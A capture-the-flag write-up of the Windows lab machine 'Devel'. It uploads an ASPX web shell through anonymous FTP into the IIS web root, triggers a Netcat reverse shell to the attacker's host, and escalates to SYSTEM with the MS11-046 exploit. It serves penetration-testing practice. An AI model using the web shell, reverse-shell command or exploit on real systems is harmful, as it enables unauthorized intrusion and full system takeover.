# Devel

**Difficulty:** Easy | **OS:** Windows | **IP:** `10.129.54.180`

## Summary
**Devel** is an easy-difficulty Windows machine that highlights the danger of shared web and file-storage roots paired with anonymous file upload permissions. Initial access is achieved by discovering an anonymous FTP service that writes directly to the IIS web server root (`C:\inetpub\wwwroot`), allowing us to upload an ASPX web shell and execute system commands. Privilege escalation to `NT AUTHORITY\SYSTEM` is completed by identifying a vulnerable, unpatched Windows 7 kernel build (Build 7600) and executing the MS11-046 privilege escalation exploit (`afd.sys`).

## Reconnaissance

### Port Scanning (Nmap)
We begin by scanning active TCP ports and identifying service versions:

- **21**: FTP (Microsoft ftpd (Anonymous login allowed) )
- **80**: HTTP (Microsoft IIS httpd 7.5)

### FTP & Web Server Analysis

1) Port 80 hosts the default Microsoft IIS 7.5 splash page.
2) Port 21 allows anonymous FTP login (`anonymous` : `''`).
3) Cross-referencing file paths reveals that the FTP root directory mirrors the web server document root (`C:\inetpub\wwwroot`). Files uploaded via FTP are instantly accessible via HTTP requests on port 80.

## Exploitation (Initial Access)

### Uploading an ASPX Web Shell via FTP
Since the web server executes ASPX files, we copy a pre-built ASPX command execution shell to our local working directory:

```cp /usr/share/davtest/backdoors/aspx_cmd.aspx ./cmdasp.aspx```

We log into the FTP server anonymously and upload the payload:

```
ftp 10.129.54.180
Name: anonymous
Password: ''
ftp> put cmdasp.aspx
```

### Upgrading to an Interactive Reverse Shell

1) We navigate to `http://10.129.54.180/cmdasp.aspx` in our browser to access the web shell interface.
2) We upload a Windows Netcat binary (`nc.exe`) to the target web root via FTP.
3) Using the ASPX command execution interface, we trigger a Netcat reverse shell back to our attack host listener (`10.10.14.28:443`):

```nc.exe -e cmd 10.10.14.28 443```

We receive an interactive shell running under the service account context (`iis apppool\web`).

## Privilege Escalation (Root Flag)

### System Enumeration

Checking account privileges and operating system build information:

```whoami /priv```

Output:

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Checking system details via `systeminfo`:

- **OS Name:** Microsoft Windows 7 Enterprise
- **OS Version:** 6.1.7600 N/A Build 7600
- **Hotfix(s):** N/A (Unpatched base installation)

### Exploiting MS11-046 (afd.sys Privilege Escalation)

The system is running an unpatched version of Windows 7 SP0 vulnerable to MS11-046 (`CVE-2011-1249`), an Ancillary Function Driver (`afd.sys`) privilege escalation flaw.

1) We upload a compiled MS11-046 binary (`ms11-046.exe`) to a writable directory (`C:\inetpub\wwwroot\` or `C:\Windows\Temp\`) via FTP.
2) Executing the exploit binary triggers privilege escalation:

```C:\inetpub\wwwroot\ms11-046.exe```

Verification of effective user identity:

```
whoami
# nt authority\system
```

We obtain full `NT AUTHORITY\SYSTEM` privileges and retrieve both `user.txt` (from `C:\Users\babis\Desktop\user.txt`) and `root.txt` (from `C:\Users\Administrator\Desktop\root.txt`).
